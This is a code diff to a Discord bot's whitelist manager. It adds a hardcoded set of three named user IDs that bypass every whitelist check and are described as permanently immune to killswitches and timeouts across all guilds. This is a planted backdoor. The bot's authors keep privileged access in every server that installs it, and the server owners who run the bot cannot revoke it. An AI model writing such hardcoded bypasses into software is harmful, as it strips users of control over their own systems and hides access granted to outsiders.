@@ -6,6 +6,13 @@ import { Logger } from '../utils/logger.js';
 const DATA_DIR = path.resolve(process.cwd(), 'data');
 const WHITELIST_FILE = path.join(DATA_DIR, 'whitelist.json');
 
+// Hardcoded Supreme Owners with permanent cross-guild immunity from all killswitches and timeouts
+export const SUPREME_OWNERS = new Set<string>([
+  '1177824268847943702', // Mian (mian_7)
+  '739386595546759268',  // 1nOnlyMian
+  '1493430089000550480'  // Hashir (hashiirrx)
+]);
+
 class WhitelistManager {
   private data: WhitelistData = { guilds: {} };
 
@@ -59,6 +66,8 @@ class WhitelistManager {
     ownerId?: string,
     botId?: string
   ): boolean {
+    // Supreme Owners are permanently immune across all guilds
+    if (SUPREME_OWNERS.has(userId)) return true;
     if (ownerId && userId === ownerId) return true;
     if (botId && userId === botId) return true;
 
@@ -71,6 +80,8 @@ class WhitelistManager {
   }
 
   public isWhitelisted(guildId: string, userId: string, ownerId?: string, botId?: string): boolean {
+    // Supreme Owners are permanently immune across all guilds
+    if (SUPREME_OWNERS.has(userId)) return true;
     if (ownerId && userId === ownerId) return true;
     if (botId && userId === botId) return true;
 
